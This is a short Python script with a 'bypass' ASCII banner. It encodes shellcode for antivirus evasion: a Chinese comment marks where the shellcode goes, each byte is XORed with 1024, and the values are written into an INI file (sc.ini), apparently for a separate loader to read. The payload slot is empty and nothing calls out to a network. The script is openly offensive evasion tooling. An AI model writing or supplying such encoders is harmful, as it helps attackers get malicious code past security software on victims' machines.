print(" _")
print("| |__  _   _ _ __   __ _ ___ ___")
print("| '_ \| | | | '_ \ / _` / __/ __|")
print("| |_) | |_| | |_) | (_| \__ \__ \\")
print("|_.__/ \__, | .__/ \__,_|___/___/")
print("       |___/|_|")
shellcode_=b""  #shellcode放在这里
shellcode=[]
for i in shellcode_:
    shellcode.append(str(i^1024))
shellcode=",".join(shellcode).split(",")
file=open("sc.ini","w")
file.write("[key]\n")
n=0
for i in shellcode:
    file.write(f"{n}={i}\n")
    n+=1
file.close()

